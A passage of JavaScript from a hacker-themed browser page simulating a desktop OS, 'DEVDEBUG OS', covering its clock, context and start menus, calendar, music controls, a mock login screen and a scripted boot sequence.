                appTray.appendChild(appIcon);
            }
            lucide.createIcons({ nodes: appTray.querySelectorAll('[data-lucide]') });
        }

        function initTime() {
            const timeDisplay = document.getElementById('current-time-display');
            const dateDisplay = document.getElementById('current-date-display');
            function updateTime() {
                const now = new Date();
                
                const day = String(now.getDate()).padStart(2, '0');
                const month = String(now.getMonth() + 1).padStart(2, '0'); // Months are 0-indexed
                const year = now.getFullYear();
                const dateStr = `${day}.${month}.${year}`; // Use dot separator

                const timeStr = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
                timeDisplay.textContent = timeStr;
                dateDisplay.textContent = dateStr;
            }
            updateTime();
            setInterval(updateTime, 1000);
        }

        function initContextMenu() {
            const contextMenu = document.getElementById('context-menu');
            const contextMenuItems = document.getElementById('context-menu-items');

            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();

                // Do not show the desktop context menu if right-clicking on a window or a taskbar icon.
                if (e.target.closest('.window') || e.target.closest('.taskbar-app-icon')) {
                    contextMenu.classList.add('hidden');
                    return;
                }

                // Show the desktop menu if the click is anywhere on the desktop container.
                if (!e.target.closest('#desktop')) return;

                const isFullScreen = !!document.fullscreenElement;
                const fullScreenText = isFullScreen ? 'Exit Full Screen' : 'Full Screen';

                contextMenuItems.innerHTML = `
                    <li data-action="refresh" class="p-2 text-sm cursor-pointer hover:bg-green-900" style="color: var(--text-color-dim);">Refresh</li>
                    <li data-action="fullscreen" class="p-2 text-sm cursor-pointer hover:bg-green-900" style="color: var(--text-color-dim);">${fullScreenText}</li>
                    <li data-action="settings" class="p-2 text-sm cursor-pointer hover:bg-green-900" style="color: var(--text-color-dim);">Settings</li>
                    <li data-action="properties" class="p-2 text-sm cursor-pointer hover:bg-green-900" style="color: var(--text-color-dim);">System Properties</li>
                    <li data-action="shutdown" class="p-2 text-sm cursor-pointer hover:bg-red-900" style="color: var(--danger-color);">Shutdown</li>
                `;

                contextMenu.style.top = `${e.clientY}px`;
                contextMenu.style.left = `${e.clientX}px`;
                contextMenu.classList.remove('hidden');
            });

            // Hide menu on left-click
            document.addEventListener('click', () => {
                contextMenu.classList.add('hidden');
            });

            // Handle actions
            contextMenu.addEventListener('click', (e) => {
                const action = e.target.dataset.action;
                if (action === 'close-app') {
                    const appIdToClose = e.target.dataset.appid;
                    if (appIdToClose) closeApp(appIdToClose);
                }

                if (action === 'refresh') {
                    const desktop = document.getElementById('desktop');
                    desktop.style.transition = 'opacity 0.01s ease-in-out';
                    desktop.style.opacity = '0.5';
                    setTimeout(() => {
                        lucide.createIcons(); // Redraw icons
                        desktop.style.opacity = '1';
                    }, 100);
                }
                else if (action === 'fullscreen') {
                    if (!document.fullscreenElement) {
                        document.documentElement.requestFullscreen().catch(err => {
                            alert(`Error attempting to enable full-screen mode: ${err.message} (${err.name})`);
                        });
                    } else {
                        document.exitFullscreen();
                    }
                }
                else if (action === 'properties') {
                    openApp('system-properties');
                }
                else if (action === 'settings') {
                    openApp('settings');
                }
                else if (action === 'shutdown') {
                    document.body.innerHTML = '<div class="w-screen h-screen flex items-center justify-center bg-black text-2xl" style="color: var(--primary-color);">SYSTEM SHUTDOWN</div>';
                    // In a real scenario, you might close connections, save state, etc.
                    setTimeout(() => { document.body.innerHTML = ''; document.body.style.backgroundColor = 'black'; }, 2000);
                }
                contextMenu.classList.add('hidden');
            });

            // Update context menu item to open new settings app
            const uiConfigItem = contextMenuItems.querySelector('[data-action="ui-config"]');
            if (uiConfigItem) { uiConfigItem.dataset.action = 'settings'; uiConfigItem.textContent = 'Settings'; }
        }
        
        function initMusic() {
            const music = document.getElementById('background-music');
            const muteBtn = document.getElementById('music-mute-btn');
            const volumeSlider = document.getElementById('volume-slider');
            
            music.volume = UI_CONSTANTS.DEFAULT_MUSIC_VOLUME;
            let isPlaying = false;
            let lastVolume = music.volume;

            // This function will be called after authentication
            const updateIcon = () => {
                let icon = 'volume-2';
                if (music.volume === 0) icon = 'volume-x';
                else if (music.volume < 0.5) icon = 'volume-1';
                muteBtn.innerHTML = `<i data-lucide="${icon}" class="w-5 h-5" style="color: var(--text-color-dim);"></i>`;
                lucide.createIcons({ nodes: [muteBtn.querySelector('i')] });
            };

            const toggleMute = () => {
                if (music.volume > 0) {
                    lastVolume = music.volume;
                    music.volume = 0;
                } else {
                    music.volume = lastVolume;
                }
                volumeSlider.value = music.volume;
                updateIcon();
            };

            muteBtn.addEventListener('click', toggleMute);
            volumeSlider.addEventListener('input', () => {
                music.volume = parseFloat(volumeSlider.value);
                updateIcon();
            });

            volumeSlider.value = music.volume;
            updateIcon();
        }
        
        function initStartMenu() {
            const startBtn = document.getElementById('start-btn');
            const startMenu = document.getElementById('start-menu');
            const startMenuAppsList = document.getElementById('start-menu-apps');
            const restartBtn = document.getElementById('start-menu-restart');
            const shutdownBtn = document.getElementById('start-menu-shutdown');
            const profileBtn = document.getElementById('start-menu-profile-btn');

            // 1. Populate the app list in the start menu
            startMenuAppsList.innerHTML = ''; // Clear any placeholders
            for (const appId in apps) {
                const appConfig = apps[appId];
                const li = document.createElement('li');
                li.className = 'p-2 flex items-center space-x-3 rounded start-menu-item cursor-pointer';
                li.dataset.appId = appId;
                li.innerHTML = `
                    <i data-lucide="${appConfig.icon}" class="w-5 h-5"></i>
                    <span>${appConfig.title}</span>
                `;
                startMenuAppsList.appendChild(li);
            }
            lucide.createIcons({ nodes: startMenuAppsList.querySelectorAll('[data-lucide]') });

            // 2. Add event listener to open apps from the menu
            startMenuAppsList.addEventListener('click', (e) => {
                const listItem = e.target.closest('li[data-app-id]');
                if (listItem) {
                    openApp(listItem.dataset.appId);
                    startMenu.classList.add('hidden'); // Close menu after opening
                }
            });

            // 3. Toggle menu visibility on start button click
            startBtn.addEventListener('click', (e) => {
                e.stopPropagation(); // Prevent document click listener from closing it immediately
                startMenu.classList.toggle('hidden');
            });

            // 4. Close menu when clicking outside
            document.addEventListener('click', (e) => {
                if (!startMenu.classList.contains('hidden') && !startMenu.contains(e.target) && !startBtn.contains(e.target)) {
                    startMenu.classList.add('hidden');
                }
            });

            // 5. Footer button actions
            restartBtn.addEventListener('click', () => location.reload());
            shutdownBtn.addEventListener('click', () => document.body.innerHTML = '<div class="w-screen h-screen flex items-center justify-center bg-black text-2xl" style="color: var(--primary-color);">SYSTEM SHUTDOWN...</div>');

            // 6. Profile button action
            profileBtn.addEventListener('click', () => {
                openApp('devdebug-profile');
                startMenu.classList.add('hidden'); // Close menu after opening
            });
        }

        function initCalendar() {
            const calendarPopup = document.getElementById('calendar-popup');
            const dateDisplayContainer = document.getElementById('system-tray').querySelector('.leading-tight');
            const monthYearEl = document.getElementById('calendar-month-year');
            const calendarBody = document.getElementById('calendar-body');
            const prevMonthBtn = document.getElementById('calendar-prev-month');
            const nextMonthBtn = document.getElementById('calendar-next-month');

            let currentDate = new Date();

            function renderCalendar(date) {
                calendarBody.innerHTML = '';
                const year = date.getFullYear();
                const month = date.getMonth();

                monthYearEl.textContent = `${date.toLocaleString('default', { month: 'long' })} ${year}`;

                // Day headers
                const days = ['Su', 'Mo', 'Tu', 'We', 'Th', 'Fr', 'Sa'];
                days.forEach(day => {
                    const dayEl = document.createElement('div');
                    dayEl.className = 'font-bold text-xs';
                    dayEl.style.color = 'var(--text-color-dim)';
                    dayEl.textContent = day;
                    calendarBody.appendChild(dayEl);
                });

                const firstDayOfMonth = new Date(year, month, 1).getDay();
                const daysInMonth = new Date(year, month + 1, 0).getDate();

                // Blank days for padding
                for (let i = 0; i < firstDayOfMonth; i++) {
                    calendarBody.appendChild(document.createElement('div'));
                }

                // Date cells
                for (let i = 1; i <= daysInMonth; i++) {
                    const dayEl = document.createElement('div');
                    dayEl.className = 'p-1 rounded-full calendar-day cursor-default';
                    dayEl.textContent = i;
                    if (i === new Date().getDate() && month === new Date().getMonth() && year === new Date().getFullYear()) {
                        dayEl.classList.add('today');
                    }
                    calendarBody.appendChild(dayEl);
                }
            }

            dateDisplayContainer.addEventListener('click', (e) => {
                e.stopPropagation();
                calendarPopup.classList.toggle('hidden');
                if (!calendarPopup.classList.contains('hidden')) {
                    renderCalendar(currentDate);
                    lucide.createIcons({ nodes: calendarPopup.querySelectorAll('[data-lucide]') });
                }
            });

            document.addEventListener('click', (e) => {
                if (!calendarPopup.classList.contains('hidden') && !calendarPopup.contains(e.target) && !dateDisplayContainer.contains(e.target)) {
                    calendarPopup.classList.add('hidden');
                }
            });

            prevMonthBtn.addEventListener('click', () => { currentDate.setMonth(currentDate.getMonth() - 1); renderCalendar(currentDate); });
            nextMonthBtn.addEventListener('click', () => { currentDate.setMonth(currentDate.getMonth() + 1); renderCalendar(currentDate); });
        }

        function initAuthScreen() {
            const authScreen = document.getElementById('auth-screen');
            const authBtn = document.getElementById('auth-btn');
            const desktop = document.getElementById('desktop');
            const taskbar = document.getElementById('taskbar');
            const clickSound = document.getElementById('click-sound');
            const hoverSound = document.getElementById('hover-sound');

            // Add hover sound effect to the button
            if (hoverSound) {
                authBtn.addEventListener('mouseenter', () => {
                    hoverSound.currentTime = 0;
                    hoverSound.play().catch(e => {});
                });
            }

            authBtn.addEventListener('click', () => {
                // 1. Show loading state on the button
                if (clickSound) {
                    clickSound.currentTime = 0;
                    clickSound.play().catch(e => {});
                }

                authBtn.disabled = true;
                authBtn.innerHTML = `
                    <div class="flex items-center justify-center">
                        <span class="m-2">AUTHENTICATING</span>
                        <i data-lucide="loader-pinwheel" class="w-5 h-5 animate-spin mr-2"></i> 
                    </div>
                `;
                lucide.createIcons({ nodes: [authBtn.querySelector('i')] });

                // 2. Simulate a delay
                setTimeout(() => {
                    // 3. Proceed with showing the desktop

                    // Fade out the auth screen
                    authScreen.style.transition = `opacity ${ANIMATION_CONSTANTS.FADE_DURATION}ms ease-out`;
                    authScreen.style.opacity = '0';

                    // Start the music now that the user has interacted
                    const music = document.getElementById('background-music');
                    if (music) {
                        music.play().catch(e => {
                            console.error("Music autoplay failed:", e);
                        });
                    }

                    // Show the desktop and taskbar
                    desktop.classList.remove('hidden');
                    taskbar.classList.remove('hidden');
                    setTimeout(() => authScreen.remove(), ANIMATION_CONSTANTS.FADE_DURATION);
                }, ANIMATION_CONSTANTS.AUTH_DELAY);
            });
        }

        function initBootSequence() {
            const bootScreen = document.getElementById('boot-screen');
            const bootTextEl = document.getElementById('boot-text');
            const authScreen = document.getElementById('auth-screen');

            const bootLines = [
                { text: 'DEVDEBUG BIOS v1.0.0 initializing...', delay: 100 },
                { text: 'Checking system memory: 65536KB OK', delay: 300 },
                { text: 'Detecting CPU: Ryzen 5 (Simulated)', delay: 100 },
                { text: 'Detecting GPU: NVIDIA RTX 5060 Ti (Sim)', delay: 100 },
                { text: 'Initializing USB controllers... Done.', delay: 200 },
                { text: 'Searching for bootable media...', delay: 500 },
                { text: 'Booting from /dev/sda1 (DEVDEBUG OS)', delay: 200 },
                { text: 'Loading kernel v5.4.0-generic-js...', delay: 400 },
                { text: 'Mounting root filesystem...', delay: 150 },
                { text: 'Starting core services:', delay: 100 },
                { text: '[OK] NetworkManager.service', delay: 100 },
                { text: '[OK] WindowManager.service', delay: 100 },
                { text: '[OK] AudioSubsystem.service', delay: 150 },
                { text: '[WARN] Unidentified process detected on port 5500', delay: 300, color: 'var(--danger-color)' },
                { text: 'Kernel loaded. Handing over to user-space...', delay: 200 },
                { text: 'Welcome to DEVDEBUG OS.', delay: 500 },
            ];

            let lineIndex = 0;

            function printNextLine() {
                if (lineIndex < bootLines.length) {
                    const line = bootLines[lineIndex];
                    const lineEl = document.createElement('div');
                    if (line.color) {
                        lineEl.style.color = line.color;
                    }
                    lineEl.textContent = line.text;
                    bootTextEl.appendChild(lineEl);
                    bootTextEl.scrollTop = bootTextEl.scrollHeight; // Auto-scroll
                    lineIndex++;
                    setTimeout(printNextLine, line.delay);
                } else {
                    // Boot sequence finished
                    setTimeout(() => {
                        bootScreen.style.transition = `opacity ${ANIMATION_CONSTANTS.FADE_DURATION}ms ease-out`;
                        bootScreen.style.opacity = '0';
                        authScreen.classList.remove('hidden');
                        setTimeout(() => {
                            authScreen.style.opacity = '1';
                            bootScreen.remove();
                            initAuthScreen();
                        }, 50);
                    }, ANIMATION_CONSTANTS.BOOT_DELAY);
                }
            }

            bootTextEl.classList.add('blinking-cursor');
            printNextLine();
        }
        // --- Initialization on page load ---
        window.onload = () => {
            window.osStartTime = new Date(); // Record the start time for uptime calculation
            initTime();
            
            // Render Lucide icons on the desktop
            lucide.createIcons();
            initContextMenu();
            initStartMenu();
            initCalendar();
            initMusic();
            initBootSequence(); // Start with the boot sequence
            // --- NEW: Icon Hover Sound ---
            const hoverSound = document.getElementById('hover-sound');
            if (hoverSound) {
                hoverSound.volume = UI_CONSTANTS.DEFAULT_SFX_VOLUME;
            }

            // Apply drag functionality and hover sound to all desktop icons
            const icons = document.querySelectorAll('.desktop-icon');
            icons.forEach(icon => {
                makeIconDraggable(icon);
                if (hoverSound) {
                    icon.addEventListener('mouseenter', () => {
                        hoverSound.currentTime = 0; // Rewind to start
                        hoverSound.play().catch(e => {}); // Play and ignore errors if interaction not yet allowed
                    });
                }
            });
        };
        
        // Override core functions to update the app tray
        const originalOpenApp = openApp;
        openApp = (appId) => { originalOpenApp(appId); updateAppTray(); };
        const originalCloseApp = closeApp;
        closeApp = (appId) => { originalCloseApp(appId); updateAppTray(); };

